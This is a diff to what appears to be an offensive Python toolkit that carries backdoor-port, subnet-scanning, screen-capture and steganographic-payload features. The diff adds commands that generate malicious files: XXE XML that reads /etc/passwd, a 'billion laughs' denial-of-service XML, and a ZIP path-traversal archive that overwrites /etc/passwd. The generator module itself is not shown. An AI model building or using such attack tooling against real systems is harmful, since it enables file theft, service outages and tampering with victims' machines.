@@ -22,6 +22,9 @@ import platform
 from PIL import ImageGrab
 import io
 
+sys.path.append(os.path.dirname(__file__))
+import badfiles_generator
+
 # --- Configuration ---
 BACKDOOR_PORT = 5555
 SCAN_SUBNET = "192.168.1."
@@ -369,6 +372,23 @@ def main():
     # --- Decode Parser ---
     decode_parser = subparsers.add_parser("decode", help="Extract a payload from an image.")
     decode_parser.add_argument("input_image")
+
+    # --- Generate Parser ---
+    generate_parser = subparsers.add_parser("generate", help="Generate a malicious file.")
+    generate_subparsers = generate_parser.add_subparsers(dest="file_type", required=True)
+
+    # XML Generator
+    xml_parser = generate_subparsers.add_parser("xml", help="Generate a malicious XML file.")
+    xml_parser.add_argument("--type", choices=["xxe", "billion_laughs"], required=True, help="Type of XML attack.")
+    xml_parser.add_argument("--output", required=True, help="Output file name.")
+    xml_parser.add_argument("--file-to-read", default="/etc/passwd", help="File to read for XXE attack.")
+
+    # ZIP Generator
+    zip_parser = generate_subparsers.add_parser("zip", help="Generate a malicious ZIP file.")
+    zip_parser.add_argument("--type", choices=["traversal"], required=True, help="Type of ZIP attack.")
+    zip_parser.add_argument("--output", required=True, help="Output file name.")
+    zip_parser.add_argument("--target-path", default="../../../../../../../../../etc/passwd", help="Target path for traversal.")
+    zip_parser.add_argument("--content", default="hacked", help="Content of the malicious file.")
     decode_parser.add_argument("--key")
     decode_parser.add_argument("--encrypt-method", default="fernet")
     decode_parser.add_argument("--compress", action="store_true")
@@ -415,6 +435,22 @@ def main():
             except UnicodeDecodeError:
                 print("Extracted Binary Data (use --output-file to save):")
                 print(base64.b64encode(extracted_data).decode('utf-8'))
+
+    elif args.command == "generate":
+        if args.file_type == "xml":
+            if args.type == "xxe":
+                content = badfiles_generator.generate_xxe_xml(args.file_to_read)
+                with open(args.output, "w") as f:
+                    f.write(content)
+                logging.info(f"Generated XXE XML file: {args.output}")
+            elif args.type == "billion_laughs":
+                content = badfiles_generator.generate_billion_laughs_xml()
+                with open(args.output, "w") as f:
+                    f.write(content)
+                logging.info(f"Generated Billion Laughs XML file: {args.output}")
+        elif args.file_type == "zip":
+            if args.type == "traversal":
+                badfiles_generator.generate_zip_traversal(args.output, args.target_path, args.content)
 
 if __name__ == "__main__":
     main()
